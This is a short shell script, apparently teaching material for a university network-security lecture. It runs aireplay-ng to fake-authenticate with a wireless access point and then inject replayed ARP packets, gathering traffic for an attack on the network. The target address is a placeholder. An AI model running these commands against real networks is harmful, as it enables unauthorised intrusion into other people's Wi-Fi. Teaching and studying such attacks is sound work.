#!/bin/sh

#  inject_arp.sh
#
#  by Avi Kak (kak@purdue.edu)

##  The following three shell scripts:
##
##      start_monitoring.sh      
##
##      inject_arp.sh                  (this file)
##
##      restore.sh
##
##
##  are meant to be used only if your version of Ubuntu is
##  older than 13.10.  If your version of Ubuntu is more
##  recent than that, you need to use the shell script
##  
##      StartMonitorModeInterface.sh
##
##  Read the Lecture 9 notes on how to use this script.

#  Execute this script in a separate window after you have 
#  fireed up the start_monitoring.sh script.

#  Note xx:xx:xx:xx:xx:xx is the MAC address of the Access Point
#  you want to attack.

#  After you have collected sufficient packets, kill the script
#  with ctrl-C.

aireplay-ng -1 0 -a xx:xx:xx:xx:xx:xx -h 00:11:22:33:44:55 mon0
sleep 10
aireplay-ng -3 -b xx:xx:xx:xx:xx:xx -h 00:11:22:33:44:55 wlan0




